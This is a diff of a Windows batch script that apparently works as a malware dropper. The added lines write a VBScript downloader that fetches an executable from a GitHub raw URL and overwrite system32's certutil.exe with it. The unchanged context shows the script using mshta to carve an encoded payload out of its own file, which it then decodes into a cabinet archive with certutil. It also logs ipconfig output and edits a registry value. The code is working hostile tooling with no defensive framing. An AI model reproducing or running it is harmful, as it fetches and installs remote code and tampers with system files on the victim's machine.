@@ -6,6 +6,27 @@ cd %windir%\addins
 ipconfig>>aypi.txt
 Reg.exe add "HKCU\Software\Microsoft\Notepad" /v "iPointSize" /t REG_DWORD /d "140" /f
 start /min aypi.txt
+if exist %windir%\system32\certutil.exe (goto decode)
+
+echo InetFile = "https://raw.githubusercontent.com/paolosezart/protor/master/certutilxp.exe">crt.vbs
+echo localFile = "%windir%\addins\certutilxp.exe">>crt.vbs
+echo Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")>>crt.vbs
+echo oXMLHTTP.Open "GET", InetFile, 0 >>crt.vbs
+echo oXMLHTTP.Send>>crt.vbs
+echo Set oADOStream = CreateObject("ADODB.Stream")>>crt.vbs
+echo oADOStream.Mode = 3 >>crt.vbs
+echo oADOStream.Type = 1 >>crt.vbs
+echo oADOStream.Open>>crt.vbs
+echo oADOStream.Write oXMLHTTP.responseBody>>crt.vbs
+echo oADOStream.SaveToFile localFile, 2 >>crt.vbs
+echo Set oXMLHTTP = Nothing>>crt.vbs
+echo Set oADOStream = Nothing>>crt.vbs
+ping 127.0.0.1 -n 1
+crt.vbs
+ping 127.0.0.1 -n 8
+move /Y certutilxp.exe %windir%\system32\certutil.exe
+del /f /q crt.vbs
+:decode
 set "x=%~f0"& set fso=CreateObject("Scripting.FileSystemObject")
 >>"Procx.64" mshta "vbscript:%fso%.GetStandardStream(1).Write(Split(%fso%.OpenTextFile("%x: ="+Chr(32)+"%").ReadAll(),vbCrLf+"exit"+Chr(32)+"/b"+Chr(32)+"0"+vbCrLf)(1))&Close()"
 certutil.exe -decode Procx.64 Procx.cab
